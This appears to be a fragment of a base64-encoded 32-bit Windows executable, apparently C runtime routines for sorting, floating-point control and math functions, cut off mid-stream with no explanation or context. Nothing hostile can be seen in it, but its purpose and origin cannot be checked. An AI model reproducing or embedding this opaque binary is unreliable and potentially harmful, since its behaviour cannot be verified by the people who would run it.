v4i0UMO/6LSARmi0UIZokB62GD+v90G4P6/nQWi8KLyoPgP8H5BmvAOAMEjTgzQgDrBbj4IEIA9kAoIHTEagJXV1Lo/w8AACPCg8QQg/j/dbCLRQxqEFmDwAzwCQiwAesVagKNRQhQUug83P//g8QMg/gCD5TAX15dw4v/VYvsi0UIg+wQi0AMkMHoA6gBdASwAcnDi0UIU1aLQAyQqMCLRQh0B4sIO0gEdE6LQBCQUOiKwP//i/BZg/7/dDwz241F+ENTUGoAagBW/xU4gEEAhcB0JY1F8FBW/xU8gEEAhcB0FotF+DtF8HUIi0X8O0X0dAIy24rD6wIywF5bycOL/1WL7F3p8vv//4v/VYvsXenX/P//i/9Vi+yLTQiD+f51Dei1g///xwAJAAAA6ziFyXgkOw04NUIAcxyLwYPhP8H4BmvJOIsEhTgzQgAPtkQIKIPgQF3D6ICD///HAAkAAADos3D//zPAXcOL/1WL7FFRi1UMVot1EA+3yleF9nUFvog1QgCDPgCNgQAkAAAPt8B1PL//AwAAZjvHdwlW6B3g//9Z61qNggAoAABmO8d3EoHh/yf//4PBQMHhCjPAiQ7rPVZR/3UI6BLg///rLrn/AwAAZjvBd8SNRfgz/1APt8Il/yP//4l9+AMGUP91CIl9/Ojn3///iT6JfgSDxAxfXsnDi/9Vi+z/dRT/dRD/dQz/dQj/FUyAQQBdw8zMi/9Vi+yB7BgBAAChBCBCADPFiUX8i00MU4tdFFaLdQiJtfz+//+Jnfj+//9Xi30Qib0A////hfZ1JYXJdCHoeYL//8cAFgAAAOisb///i038X14zzVvoZ/L+/4vlXcOF/3Tbhdt018eF6P7//wAAAACD+QJy2EkPr88DzomNCP///4vBM9Irxvf3QIP4CA+HtgAAADvOD4YnBAAAjRQ3iZXw/v//i8aL8omFBP///zvxdy9QVovL/xW0gUEA/9ODxAiFwH4Ki8aJhQT////rBouFBP///4uNCP///wP3O/F20Ym99P7//4vRO8F0OyvBi9+JhQT////rBo2bAAAAAIoMEI1SAYu1BP///4pC/4hEFv+LxohK/4PrAXXji534/v//i40I////i7X8/v//K8+LlfD+//+JjQj///87zg+HYP///+l5AwAA0eiLyw+vx4mFBP///408MFdWib3s/v///xW0gUEA/9OLtQD///+DxAiFwIuF/P7//35NibX0/v//ib3w/v//O8d0PYud9P7//4v3i70E////6wONSQCKBovWK9eKCogCiA5Gg+sBde6Lvez+//+Lnfj+//+LtQD///+Lhfz+////tQj///+Ly1D/FbSBQQD/04uVCP///4PECIXAfkmLhfz+//+Jtez+//+L8jvCdDeLnez+//8rwomF8P7//4vQjZsAAAAAigaNdgGKTDL/iEQy/4hO/4PrAXXri534/v//i5UI////UleLy/8VtIFBAP/Ti5UI////g8QIhcCLhQD///9+NYvYi/I7+nQti8crwomF7P7//4vQigaNdgGKTDL/iEQy/4hO/4PrAXXri4UA////i5UI////i7X8/v//i9qJlQT///87/nY+6weNpCQAAAAAA/CJtfT+//8793Mji434/v//V1b/FbSBQQD/lfj+//+DxAiFwIuFAP///37T60KLlQj///+Lnfj+///rA41JAAPwO/J3H1dWi8v/FbSBQQD/04uVCP///4PECIXAi4UA////ftuLnQT///+JtfT+//+Ltfj+///rB42kJAAAAACLhQD///+LyyvYiY0E////O992H1dTi87/FbSBQQD/1oPECIXAf9mLhQD///+LjQT///+LtfT+//+JnQT///873nJKiYXw/v//i9N0Kyvzi9iKAo1SAYpMFv+IRBb/iEr/g+sBdeuLtfT+//+LnQT///+LhQD///+LlQj///87+w+F7f7//4v+6eb+//87+XM8i534/v//6weNpCQAAAAAK8iJjQT///87z3YhV1GLy/8VtIFBAP/Ti40E////g8QIhcCLhQD///901etEi534/v//i7X8/v//jaQkAAAAACvIiY0E////O852H1dRi8v/FbSBQQD/04uNBP///4PECIXAi4UA////dNWLtfT+//+LlQj///+Lyou9BP///yvOi8crhfz+//87wXw9i4X8/v//O8dzGIuN6P7//4lEjYSJvI0M////QYmN6P7//4uNCP///4u9AP///zvxc0SJtfz+///p+Pv//zvycxiLhej+//+JdIWEiZSFDP///0CJhej+//+Ltfz+//8793MNi8+LvQD////pv/v//4u9AP///4uF6P7//4PoAYmF6P7//w+Idvv//4t0hYSLjIUM////ibX8/v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QC9tXZydnh66Dp6wIAAOmpAwAA3djd2NstAONBAMaFcP///wLD2e3Zydnkm929YP///5v2hWH///9BddLZ8cPGhXD///8C3djbLQrjQQDDCsl1U8PZ7OsC2e3ZyQrJda7Z8cPpkQIAAOjPAAAA3djd2ArJdQ7Z7oP4AXUGCu10Atngw8aFcP///wLbLQDjQQCD+AF17QrtdOnZ4Ovl3djpQgIAAN3Y6RMDAABY2eSb3b1g////m/aFYf///wF1D93Y2y0A40EACu10Atngw8aFcP///wTpDAIAAN3Y3djbLQDjQQDGhXD///8DwwrJda/d2NstAONBAMPZwNnh2y0e40EA3tmb3b1g////m/aFYf///0F1ldnA2fzZ5JvdvWD///+bipVh////2cnY4dnkm929YP///9nh2fDD2cDZ/NjZm9/gnnUa2cDcDTLjQQDZwNn83tmb3+CedA24AQAAAMO4AAAAAOv4uAIAAADr8VaD7HSL9FaD7AjdHCSD7AjdHCSb3XYI6NkHAACDxBTdZgjdBoPEdF6FwHQF6S4CAADDzMzMzMzMzMzMzIB6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+7juNBANnliZVs////m929YP///8aFcP///wCbio1h////0OHQ+dDBisEkD9cPvsCB4QQEAACL2gPYg8MQUFJRiwv/FbSBQQBZWlj/I4B6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+7juNBANnliZVs////m929YP///8aFcP///wDZyYqNYf///9nlm929YP///9nJiq1h////0OXQ/dDFisUkD9eK4NDh0PnQwYrBJA/X0OTQ5ArED77AgeEEBAAAi9oD2IPDEFBSUYsL/xW0gUEAWVpY/yPoDwEAANnJjaQkAAAAAI1JAN3YjaQkAAAAAI2kJAAAAADD6O0AAADr6N3Y3djZ7sOQ3djd2NnuhO10Atngw93YkN3Y2ejDjaQkAAAAAI1kJADbvWL////brWL////2hWn///9AdAjGhXD///8Aw8aFcP///wDcBX7jQQDD6wPMzMzZyY2kJAAAAACNpCQAAAAA271i////261i////9oVp////QHQJxoVw////AOsHxoVw////AN7Bw42kJAAAAACQ271i////26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